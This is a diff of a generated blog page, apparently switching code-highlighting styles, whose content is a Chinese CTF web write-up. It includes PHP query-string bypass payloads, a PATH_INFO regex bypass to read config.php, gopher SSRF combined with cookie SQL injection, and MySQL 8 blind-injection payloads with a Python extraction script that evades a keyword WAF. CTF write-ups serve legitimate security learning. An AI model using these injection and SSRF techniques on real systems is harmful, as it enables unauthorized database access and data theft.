@@ -29,7 +29,15 @@
     
     
       
-      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/atom-one-dark-reasonable.min.css" />
+      
+        
+          
+          
+          
+        
+        <link  rel="stylesheet" href="https://cdn.staticfile.org/prism/1.22.0/themes/prism-funky.min.css" />
+      
+      
     
   
 
@@ -245,7 +253,7 @@
               </p>
             
             <div class="markdown-body">
-              <h2 id="middle-magic"><a href="#middle-magic" class="headerlink" title="middle_magic"></a>middle_magic</h2><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+              <h2 id="middle-magic"><a href="#middle-magic" class="headerlink" title="middle_magic"></a>middle_magic</h2><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
     highlight_file(<span class="hljs-keyword">__FILE__</span>);
     <span class="hljs-keyword">include</span> <span class="hljs-string">&quot;./flag.php&quot;</span>;
     <span class="hljs-keyword">include</span> <span class="hljs-string">&quot;./result.php&quot;</span>;
@@ -296,13 +304,13 @@
         <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;hr&gt;&#x27;</span>;
     &#125;
 
-<span class="hljs-meta">?&gt;</span></code></pre></div>
+<span class="hljs-meta">?&gt;</span></code></pre>
 
 <p>payload:</p>
-<div class="hljs"><pre><code>?aaa=%0apass_the_level_1%23
+<pre><code>?aaa=%0apass_the_level_1%23
 
-admin[]=1&amp;root_pwd[]=2&amp;level_3=&#123;&quot;result&quot;:true&#125;</code></pre></div>
-<h2 id="EasyP"><a href="#EasyP" class="headerlink" title="EasyP"></a>EasyP</h2><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+admin[]=1&amp;root_pwd[]=2&amp;level_3=&#123;&quot;result&quot;:true&#125;</code></pre>
+<h2 id="EasyP"><a href="#EasyP" class="headerlink" title="EasyP"></a>EasyP</h2><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
 <span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;config.php&#x27;</span>; 
 
 <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&#x27;/config\.php\/*$/i&#x27;</span>, $_SERVER[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>])) &#123;
@@ -343,10 +351,10 @@ $secret = bin2hex(random_bytes(<span class="hljs-number">64</span>));
 <span class="hljs-string">      &lt;input type=&quot;submit&quot;&gt;</span>
 <span class="hljs-string">    &lt;/form&gt;</span>
 <span class="hljs-string">  &lt;/body&gt;</span>
-<span class="hljs-string">&lt;/html&gt;</span></code></pre></div>
+<span class="hljs-string">&lt;/html&gt;</span></code></pre>
 
 <p>通过<code>highlight_file</code>读取<code>config.php</code><br>但被过了，需要个字符绕过*的匹配</p>
-<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
 <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check</span>(<span class="hljs-params">$str</span>)</span>&#123;
     <span class="hljs-keyword">return</span> preg_match(<span class="hljs-string">&#x27;/config\.php\/*$/i&#x27;</span>, $str);
 &#125;
@@ -357,13 +365,13 @@ $secret = bin2hex(random_bytes(<span class="hljs-number">64</span>));
         <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;$&#123;i&#125;: $&#123;t&#125;\n&quot;</span>;
     &#125;
 &#125;
-<span class="hljs-meta">?&gt;</span></code></pre></div>
+<span class="hljs-meta">?&gt;</span></code></pre>
 
 <p>payload:<code>/index.php/config.php/%80?source</code></p>
 <h2 id="easy-sql-1"><a href="#easy-sql-1" class="headerlink" title="easy_sql_1"></a>easy_sql_1</h2><p>进去有个<code>use.php</code>,ssrf，但<code>index.php</code>的表单提交不了，没反应</p>
 <p>要用gopher协议打post<br>然后adminadmin登录后发现给了<br><code>cookie:this_is_your_cookie=YWRtaW4=</code>，把cookie带上</p>
 <p>cookie存在sql注入</p>
-<div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests
+<pre><code class="hljs python"><span class="hljs-keyword">import</span> requests
 <span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> quote
 
 data=<span class="hljs-string">&quot;&quot;&quot;POST / HTTP/1.1</span>
@@ -387,35 +395,35 @@ headers=&#123;
 &#125;
 
 r=requests.get(url,params=params,headers=headers)
-print(r.text)</code></pre></div>
+print(r.text)</code></pre>
 
 <h2 id="easy-sql-2"><a href="#easy-sql-2" class="headerlink" title="easy_sql_2"></a>easy_sql_2</h2><p>WAF:</p>
-<div class="hljs"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&quot;/select|;|creat|like|insert| |sys|drop|union|file|show|rename|handler|alter|sys|if|prepare|execute|tables|delete|where\./i&quot;</span>, $value))&#123;
+<pre><code class="hljs php"><span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&quot;/select|;|creat|like|insert| |sys|drop|union|file|show|rename|handler|alter|sys|if|prepare|execute|tables|delete|where\./i&quot;</span>, $value))&#123;
     <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;try again!&#x27;</span>);
     <span class="hljs-keyword">exit</span>();
-&#125;</code></pre></div>
+&#125;</code></pre>
 
 <p>注库名：</p>
-<div class="hljs"><pre><code class="hljs sql">(ascii(substr(database(),&#123;i&#125;,1)))=&#123;val&#125;</code></pre></div>
+<pre><code class="hljs sql">(ascii(substr(database(),&#123;i&#125;,1)))=&#123;val&#125;</code></pre>
 
 <p>tables被过，不能用<code>information_schema.tables</code>;</p>
 <p>mysql8中有<code>mysql.innodb_table_stats</code>和<code>mysql.innodb_index_stats</code>;以此获取表名</p>
-<div class="hljs"><pre><code class="hljs sql">admin&#x27; and ((&quot;ctf&quot;,&quot;%s&quot;,1,1,1,1,1,1)&lt;(table mysql.innodb_index_stats order by last_update desc limit 5,1))#</code></pre></div>
+<pre><code class="hljs sql">admin&#x27; and ((&quot;ctf&quot;,&quot;%s&quot;,1,1,1,1,1,1)&lt;(table mysql.innodb_index_stats order by last_update desc limit 5,1))#</code></pre>
 
 <p>select 被过，用MySQL8的table语句</p>
-<div class="hljs"><pre><code class="hljs sql">TABLE table_name [ORDER BY column_name] [LIMIT number [OFFSET number]]</code></pre></div>
+<pre><code class="hljs sql">TABLE table_name [ORDER BY column_name] [LIMIT number [OFFSET number]]</code></pre>
 
 <p>可以把<code>table t</code>简单理解成<code>select * from t</code>，和<code>select</code>的区别在于</p>
 <ul>
 <li><code>table</code>总是显示表的所有列</li>
 <li><code>table</code>不允许任何的行过滤;也就是说，<code>TABLE</code>不支持任何<code>WHERE</code>子句。<br> 可以用来盲注表名</li>
 </ul>
-<div class="hljs"><pre><code class="hljs sql">admin&#x27; and ((&quot;ctf&quot;,&quot;%s&quot;,1,1,1,1,1,1)&lt;(table mysql.innodb_index_stats order by last_update desc limit 5,1))#</code></pre></div>
+<pre><code class="hljs sql">admin&#x27; and ((&quot;ctf&quot;,&quot;%s&quot;,1,1,1,1,1,1)&lt;(table mysql.innodb_index_stats order by last_update desc limit 5,1))#</code></pre>
 
 <p>注数据</p>
-<div class="hljs"><pre><code class="hljs sql">(ascii(substr(hex((table fl11aag limit 1,1)),&#123;i&#125;,1)))=&#123;val&#125;</code></pre></div>
+<pre><code class="hljs sql">(ascii(substr(hex((table fl11aag limit 1,1)),&#123;i&#125;,1)))=&#123;val&#125;</code></pre>
 
-<div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests
+<pre><code class="hljs python"><span class="hljs-keyword">import</span> requests
 <span class="hljs-keyword">import</span> string
 <span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> sleep
 
@@ -445,7 +453,7 @@ flag=<span class="hljs-string">&quot;flag&#123;&quot;</span>
             <span class="hljs-comment">#print(j)</span>
             flag+=<span class="hljs-built_in">chr</span>(j<span class="hljs-number">-1</span>)
             print(flag)
-            <span class="hljs-keyword">break</span></code></pre></div>
+            <span class="hljs-keyword">break</span></code></pre>
 
 <h2 id="Spring"><a href="#Spring" class="headerlink" title="Spring"></a>Spring</h2><p><a target="_blank" rel="noopener" href="http://blog.cyberpeace.cn/Spring-Web-Flow/">http://blog.cyberpeace.cn/Spring-Web-Flow/</a></p>
 
@@ -603,6 +611,8 @@ flag=<span class="hljs-string">&quot;flag&#123;&quot;</span>
 
 
 
+  
+    
   
 
 
